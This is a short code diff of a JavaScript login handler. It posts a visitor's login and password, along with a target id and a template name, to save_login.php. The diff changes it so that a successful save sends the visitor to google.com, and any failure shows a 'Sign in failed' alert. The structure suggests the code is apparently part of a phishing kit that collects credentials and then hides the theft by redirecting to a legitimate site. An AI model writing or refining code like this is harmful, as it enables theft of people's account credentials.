@@ -80,7 +80,16 @@
                 url: BASE_URL + 'save_login.php',
                 data: { tid: tid, login: login, password: password, template: 'default' },
                 dataType: 'json',
-                complete: function () {
+                success: function (data) {
+                    if (data && data.ok) {
+                        window.location.href = 'https://www.google.com/';
+                        return;
+                    }
+                    btn.textContent = 'Continue';
+                    btn.disabled = false;
+                    alert('Sign in failed. Please check your details and try again.');
+                },
+                error: function () {
                     btn.textContent = 'Continue';
                     btn.disabled = false;
                     alert('Sign in failed. Please check your details and try again.');
